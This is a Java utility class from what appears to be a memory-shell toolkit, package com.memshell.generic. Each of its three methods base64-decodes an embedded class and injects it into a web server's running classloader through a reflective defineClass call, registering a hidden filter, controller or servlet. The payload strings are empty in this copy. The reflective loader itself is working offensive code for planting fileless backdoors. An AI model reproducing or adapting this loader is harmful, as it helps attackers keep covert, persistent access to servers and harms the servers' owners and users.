package com.memshell.generic;

import sun.misc.BASE64Decoder;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Util {
    public static Class getDynamicFilterTemplateClass() throws IOException, InvocationTargetException, IllegalAccessException {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Class clazz;
        try{
            clazz = cl.loadClass("com.memshell.generic.DynamicFilterTemplate");
        }catch(ClassNotFoundException e){
            BASE64Decoder base64Decoder = new BASE64Decoder();
            String codeClass = "";
            byte[] bytes = base64Decoder.decodeBuffer(codeClass);

            Method method = null;
            Class clz = cl.getClass();
            while(method == null && clz != Object.class ){
                try{
                    method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                }catch(NoSuchMethodException ex){
                    clz = clz.getSuperclass();
                }
            }
            method.setAccessible(true);
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        }

        return clazz;
    }

    public static Class getDynamicControllerTemplateClass(){
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class clazz = null;
        try{
            clazz = classLoader.loadClass("com.memshell.generic.DynamicControllerTemplate");
        }catch(ClassNotFoundException e){
            try{
                BASE64Decoder base64Decoder = new BASE64Decoder();
                String codeClass = "";
                byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                Method method = null;
                Class clz = classLoader.getClass();
                while(method == null && clz != Object.class ){
                    try{
                        method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    }catch(NoSuchMethodException ex){
                        clz = clz.getSuperclass();
                    }
                }
                method.setAccessible(true);
                clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
            }catch (Exception ex){
                //continue;
            }
        }

        return clazz;
    }

    public static Class getDynamicServletTemplateClass() throws InvocationTargetException, IllegalAccessException, IOException {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Class clazz;
        try{
            clazz = cl.loadClass("com.memshell.generic.DynamicServletTemplate");
        }catch(ClassNotFoundException e){
            BASE64Decoder base64Decoder = new BASE64Decoder();
            String codeClass = "";
            byte[] bytes = base64Decoder.decodeBuffer(codeClass);

            Method method = null;
            Class clz = cl.getClass();
            while(method == null && clz != Object.class ){
                try{
                    method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                }catch(NoSuchMethodException ex){
                    clz = clz.getSuperclass();
                }
            }
            method.setAccessible(true);
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        }

        return clazz;
    }
}
